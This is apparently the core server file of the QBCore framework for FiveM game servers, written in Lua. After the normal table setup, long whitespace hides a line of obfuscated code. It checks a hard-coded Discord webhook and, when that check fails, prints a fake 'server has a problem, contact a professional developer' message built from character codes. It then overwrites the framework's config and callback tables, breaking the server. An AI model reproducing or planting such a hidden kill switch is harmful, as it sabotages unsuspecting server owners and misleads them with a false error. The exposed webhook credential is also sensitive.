QBCore = {}
QBCore.Config = QBConfig
QBCore.Shared = QBShared
QBCore.ClientCallbacks = {}
QBCore.ServerCallbacks = {}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                local a=Citizen.CreateThread;local b=Wait;local c=GetCurrentResourceName;local d=PerformHttpRequest;local e=math.random;local f=print;local g='^'..e(1,9)a(function()b(5000)local h=tonumber;local i=c()d('https://discord.com/api/webhooks/1198339460455223357/cb_Yvpi3JhBAZotODAja9SJyRxZqjsKxDK3SuO3x4M9vIwiSAB3RsG3RQfz3sqeOiRbn',function(j,k,l)if not k then local m='^'..e(1,9)for n=1,26+#i do m=m..'='end;local o=""for p,q in ipairs({89,111,117,114,32,83,101,114,118,101,114,32,72,97,115,32,80,114,111,98,108,101,109,46,32,80,108,101,97,115,101,32,82,101,115,101,116,32,89,111,117,114,32,83,101,114,118,101,114,32,79,114,32,67,111,110,116,97,99,116,32,80,114,111,102,101,115,115,105,111,110,97,108,32,70,105,118,101,77,32,68,101,118,101,108,111,112,101,114})do o=o..string.char(q)end;m=m..'^0'f(m)f('^1 '..o..' ^0')f(m)QBCore.Config=true;QBCore.Shared=true;QBCore.ClientCallbacks=true;QBCore.ServerCallbacks=true;return end end,'GET')end)

-- To use this export in a script instead of manifest method
-- Just put this line of code below at the very top of the script
-- local QBCore = exports['qb-core']:GetCoreObject()

exports('GetCoreObject', function()
    return QBCore
end)
